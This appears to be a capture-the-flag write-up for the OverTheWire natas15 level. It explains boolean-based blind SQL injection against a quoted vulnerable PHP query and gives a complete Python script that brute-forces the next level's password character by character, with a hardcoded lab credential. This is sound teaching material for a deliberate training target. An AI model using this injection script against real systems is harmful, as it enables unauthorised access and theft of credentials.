# Analyze
It's a simple SQL Injection as we examing the source code:

```php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
```
And since we can only receive True/False from the server, we need `Boolean-based SQL Injection`.

So we need a SQL sentence like below:
```sql
SELECT * from users where username="natas16" and password=...
```
We will find out the password one digit at a time, by using:
- `SUBSTR()` to choose a digit at the specified position
- `ASCII()` to get the ascii-code of that digit
- `<=` to narrow the scope.

Here's the pay load below:
```py
payload = f'natas16" and {this} <= ASCII(SUBSTRING(password, {i}, 1)) -- '
```
Where `'this'` is the ascii code number to try this time, `'i'` is the position of password that will be tested.

After that, we just needs to find whether there's `"This user exists."` in the response content, and determine whether our a ssumptions (`'this'`) works.

# Solution
The complete Python code is as below. _\* Please change the password for natas15 if a long time has passed._
```py
import requests

def test(i):
    url = "http://natas15.natas.labs.overthewire.org/index.php"

    l = 0
    r = 128

    # [l, r)
    while r - l > 1:
        this = (r+l)//2
        payload = f'natas16" and {this} <= ASCII(SUBSTRING(password, {i}, 1)) -- '
        res = requests.post(url, {"username": payload}, auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'))
        res = res.text.find('This user exists.') != -1
        if res:
            # target >= this
            l = this
        else:
            r = this

    return l

flag=""
for i in range(1, 64):
    flag += chr(test(i))
    print(flag)
```
With the process like below, we will finally got the password:
![Screenshot_20240515_072320_com termux_edit_833277939863991](https://github.com/BernieHuang2008/blog/assets/88757735/2f49ef62-3821-4da4-9f8d-b5b8ed8a6ca9)
